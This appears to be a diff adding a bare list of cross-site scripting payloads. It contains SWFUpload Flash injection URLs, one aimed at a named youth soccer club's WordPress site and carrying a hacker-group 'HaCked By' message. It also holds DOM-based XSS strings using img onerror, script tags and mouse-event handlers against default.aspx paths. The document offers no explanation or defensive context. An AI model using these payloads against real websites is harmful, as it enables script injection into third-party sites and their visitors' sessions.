@@ -1,0 +1,26 @@
+https://celebrationyouthsoccer.com/wp-content/plugins/bp-gallery/inc/js/swfupload/swfupload.swf?movieName=%22]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%28%27HaCked%20ByKedAns-Dz%27%29;//
+
+
+
+http://demo.swfupload.org/v220/swfupload/swfupload.swf?buttonText=%3Ca%20href=%22javascript:alert(top.location)%22%3EClick+For+XSS%20%3Cfont%20size=%2216%22%3E%3C/a%3E
+
+
+
+
+DOM Based XSS Scripts
+/default.aspx#"><img src=x onerror=prompt('XSS');>
+ /default.aspx#"><img src=x onerror=prompt('0');>    
+
+<img src=x onerror=prompt(1);> by ">
+
+
+ "><img src=x onerror=prompt(1);>
+
+"><script>alert('XSS')</script>
+
+id=abc"><Script>alert(/xss/)</SCRIPT>
+
+
+"><img src=" " onMouseover=prompt(/xss/);> 
+
+Default.aspx/" onmouseout="confirm(1)'x="
